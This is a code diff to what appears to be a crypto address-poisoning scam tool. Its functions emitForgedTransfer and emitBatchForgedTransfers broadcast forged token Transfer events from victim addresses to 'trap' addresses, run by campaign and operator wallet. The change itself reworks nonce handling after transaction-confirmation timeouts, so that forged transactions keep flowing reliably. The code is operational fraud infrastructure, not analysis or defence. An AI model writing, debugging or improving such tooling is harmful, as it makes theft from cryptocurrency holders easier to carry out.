@@ -1141,7 +1141,7 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     }
 
     // 🚀 CRITICAL FIX: Wait for the transaction to be ACTUALLY MINED before moving on.
-    let receiptSuccess = false;
+    // Without this, sequential nonces pile up and ALL get stuck if the first one is delayed.
     try {
       const receipt = await client.waitForTransactionReceipt({
         hash: hash,
@@ -1149,20 +1149,11 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
         confirmations: 1,
       });
       logger.info(`[mirror] ✅ TX confirmed in block ${receipt.blockNumber} (status: ${receipt.status})`);
-      receiptSuccess = true;
     } catch (waitErr) {
-      logger.warn(`[mirror] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 90s (may have been dropped): ${waitErr.message?.slice(0, 60)}`);
+      logger.warn(`[mirror] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 90s (may still mine later): ${waitErr.message?.slice(0, 60)}`);
     }
 
-    if (receiptSuccess) {
-      confirmNonceIncrement(campaignId, operatorAddress);
-    } else {
-      // 🚀 SELF-HEALING NONCE: If it timed out, it was likely dropped by the node.
-      // Clear the local nonce so the next transaction fetches a fresh one from the network.
-      logger.warn(`[mirror] 🔄 Clearing local nonce for ${operatorAddress.slice(0, 10)}... to prevent desync.`);
-      const nonces = campaignNonces.get(campaignId);
-      if (nonces) nonces.delete(operatorAddress);
-    }
+    confirmNonceIncrement(campaignId, operatorAddress);
 
     logger.info(`[mirror] Forged Transfer emitted via ${contractAddress.slice(0, 10)}...: ${victimAddress} → ${trapAddress} raw=${rawValue} tx=${hash}`);
     return hash;
@@ -1452,7 +1443,7 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
     }
 
     // 🚀 CRITICAL FIX: Wait for the transaction to be ACTUALLY MINED before moving on.
-    let receiptSuccess = false;
+    // Without this, sequential nonces pile up and ALL get stuck if the first one is delayed.
     try {
       const receipt = await client.waitForTransactionReceipt({
         hash: hash,
@@ -1460,20 +1451,11 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
         confirmations: 1,
       });
       logger.info(`[batch] ✅ TX confirmed in block ${receipt.blockNumber} (status: ${receipt.status})`);
-      receiptSuccess = true;
     } catch (waitErr) {
-      logger.warn(`[batch] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 90s (may have been dropped): ${waitErr.message?.slice(0, 60)}`);
+      logger.warn(`[batch] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 90s (may still mine later): ${waitErr.message?.slice(0, 60)}`);
     }
 
-    if (receiptSuccess) {
-      confirmNonceIncrement(campaignId, operatorAddress);
-    } else {
-      // 🚀 SELF-HEALING NONCE: If it timed out, it was likely dropped by the node.
-      // Clear the local nonce so the next transaction fetches a fresh one from the network.
-      logger.warn(`[batch] 🔄 Clearing local nonce for ${operatorAddress.slice(0, 10)}... to prevent desync.`);
-      const nonces = campaignNonces.get(campaignId);
-      if (nonces) nonces.delete(operatorAddress);
-    }
+    confirmNonceIncrement(campaignId, operatorAddress);
 
     logger.info(`[batch] Forged batch emitted via ${contractAddress.slice(0, 10)}...: ${froms.length} transfers, tx=${hash}`);
     return hash;
